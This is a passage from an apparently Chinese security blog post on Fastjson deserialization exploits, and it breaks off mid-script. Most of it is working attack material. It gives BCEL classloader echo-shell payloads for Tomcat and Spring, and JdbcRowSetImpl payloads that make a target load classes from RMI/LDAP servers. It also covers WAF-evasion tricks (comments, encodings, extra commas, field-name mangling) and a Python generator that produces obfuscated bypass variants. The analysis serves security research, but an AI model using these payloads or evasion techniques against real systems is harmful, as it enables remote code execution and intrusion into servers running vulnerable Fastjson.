class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还可以构造Tomcat&#x2F;SpringBoot的回显马。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tomcat Echo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;字节码放入此处&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spring Echo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;c&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;字节码放入此处&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h3><p><font style="color:#000000;">对于WAF设备，可以采用常规的Bypass的手段来进行绕过，例如利用过长字符来使得服务器放行流量；或者结合中间件的解析，例如multipart支持指定Content-Transformer-Encoding，可以使用Base64或quoted-printable（QP编码）来绕过WAF。</font></p>
<p><font style="color:#000000;">下文着重分析Fastjson在解析过程中的的特性来构造混淆Payload，从而绕过WAF层面的流量检测。</font></p>
<h4 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h4><p><font style="color:#000000;">在上文分析漏洞流程时，</font><font style="color:#000000;background-color:#ffffff;">skipWhitespace方法多次出现在解析过程中，可以看到会默认去除键、值外的空格、\r、\n、\t、\f、\b等字符。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\f&#x27;</span> || ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                skipComment();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注释字符"><a href="#注释字符" class="headerlink" title="注释字符"></a>注释字符</h4><p><font style="color:#000000;">在上文的skipWhitespace方法中，可以看到如果当前字符为&#x2F;的话，会调用skipComment方法，可以看到在skipComment方法中，fastjson处理的注释主要有两类，&#x2F;&#x2F;comment\n和&#x2F;<em>comment</em>&#x2F;，因此可以利用注释字符来混淆Payload。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            next();</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">        next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; ch != EOI;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    next();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            next();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="默认开启的Feature"><a href="#默认开启的Feature" class="headerlink" title="默认开启的Feature"></a>默认开启的Feature</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">features</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    features |= Feature.AutoCloseSource.getMask();</span><br><span class="line">    features |= Feature.InternFieldNames.getMask();</span><br><span class="line">    features |= Feature.UseBigDecimal.getMask();</span><br><span class="line">    features |= Feature.AllowUnQuotedFieldNames.getMask();</span><br><span class="line">    features |= Feature.AllowSingleQuotes.getMask();</span><br><span class="line">    features |= Feature.AllowArbitraryCommas.getMask();</span><br><span class="line">    features |= Feature.SortFeidFastMatch.getMask();</span><br><span class="line">    features |= Feature.IgnoreNotMatch.getMask();</span><br><span class="line">    DEFAULT_PARSER_FEATURE = features;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">AllowUnQuotedFieldNames，允许JSON字段名不被引号包括，只在恢复字段的过程调用当中有效果</font></li>
</ul>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735042059477-90d803b3-e76e-4114-8d4d-fcf30fc8c9be.png"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line">-&gt;</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span>dataSourceName<span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">AllowSingleQuotes，允许使用单引号包裹字段名</font></li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span>&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;<span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">AllowArbitraryCommas，允许使用多个逗号</font></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line"><span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        lexer.skipWhitespace();</span><br><span class="line">        ch = lexer.getCurrent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p><font style="color:#000000;">在com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol方法中，如果遇到了\u或者\x，会自动将键与值进行unicode与十六进制解码。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">    <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> ch = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> ch = next();</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">    <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>) x_val;</span><br><span class="line">    hash = <span class="number">31</span> * hash + (<span class="type">int</span>) x_char;</span><br><span class="line">    putChar(x_char);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">    <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> chLocal = next();</span><br><span class="line">    <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line">    hash = <span class="number">31</span> * hash + val;</span><br><span class="line">    putChar((<span class="type">char</span>) val);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<h4 id="智能匹配"><a href="#智能匹配" class="headerlink" title="智能匹配"></a>智能匹配</h4><p><font style="color:#000000;">对字段添加多个下划线或者减号，fastjson 1.2.36版本前，在com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch方法中，解析字段的key的时候，_和-会被自动清除，但是需要注意只能使用同一种。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">        snakeOrkebab = <span class="literal">true</span>;</span><br><span class="line">        key2 = key.replaceAll(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在fastjson 1.2.36版本后，JavaBeanDeserializer#smartMatch方法会调用TypeUtils#fnv1a_64_lower方法来进行处理，可以看到会自动去除_和-。除此以外，当key的前缀为is时，会自动去除is，同时TypeUtils#fnv1a_64_lower方法会忽略key的大小写。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043638422-3f98c53a-30eb-40cf-b9d6-32373daf4019.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735043481307-64af2ec3-e6f1-4e51-b8f1-f7cb624cf857.png"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;isdata-So_urceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">下面是Longofo师傅写的一个小脚本，可以将基础Payload转出各种绕过的形态。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONDecodeError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastJsonPayload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_payload</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(base_payload)</span><br><span class="line">        <span class="keyword">except</span> JSONDecodeError <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">        <span class="variable language_">self</span>.base_payload = base_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_common</span>(<span class="params">self, payload, func</span>):</span><br><span class="line">        tmp_payload = json.loads(payload)</span><br><span class="line">        dct_objs = [tmp_payload]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(dct_objs) &gt; <span class="number">0</span>:</span><br><span class="line">            tmp_objs = []</span><br><span class="line">            <span class="keyword">for</span> dct_obj <span class="keyword">in</span> dct_objs:</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> dct_obj:</span><br><span class="line">                    <span class="keyword">if</span> key == <span class="string">&quot;@type&quot;</span>:</span><br><span class="line">                        dct_obj[key] = func(dct_obj[key])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(dct_obj[key]) == <span class="built_in">dict</span>:</span><br><span class="line">                        tmp_objs.append(dct_obj[key])</span><br><span class="line">            dct_objs = tmp_objs</span><br><span class="line">        <span class="keyword">return</span> json.dumps(tmp_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加L开头;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload1</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;L&quot;</span> + v + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加LL开头;;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload2</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;LL&quot;</span> + v + <span class="string">&quot;;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\u</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload3</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\x</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload4</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成cache绕过payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload5</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        cache_payload = &#123;</span><br><span class="line">            <span class="string">&quot;rand1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_payload[<span class="string">&quot;rand2&quot;</span>] = json.loads(payload)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(cache_payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">self</span>):</span><br><span class="line">        payloads = []</span><br><span class="line"></span><br><span class="line">        payload1 = <span class="variable language_">self</span>.gen_payload1(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload1</span><br><span class="line"></span><br><span class="line">        payload2 = <span class="variable language_">self</span>.gen_payload2(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload2</span><br><span class="line"></span><br><span class="line">        payload3 = <span class="variable language_">self</span>.gen_payload3(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload3</span><br><span class="line"></span><br><span class="line">        payload4 = <span class="variable language_">self</span>.gen_payload4(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload4</span><br><span class="line"></span><br><span class="line">        payload5 = <span class="variable language_">self</span>.gen_payload5(<span class="variable language_">self</span>.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload5</span><br><span class="line"></span><br><span class="line">        payloads.append(payload1)</span><br><span class="line">        payloads.append(payload2)</span><br><span class="line">        payloads.append(payload5)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            <span class="keyword">yield</span> <span class="variable language_">self</span>.gen_payload3(payload)</span><br><span class="line">            <span class="keyword">yield</span> <span class="variable language_">self</span>.gen_payload4(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fjp = FastJsonPayload(<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;rand1&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> 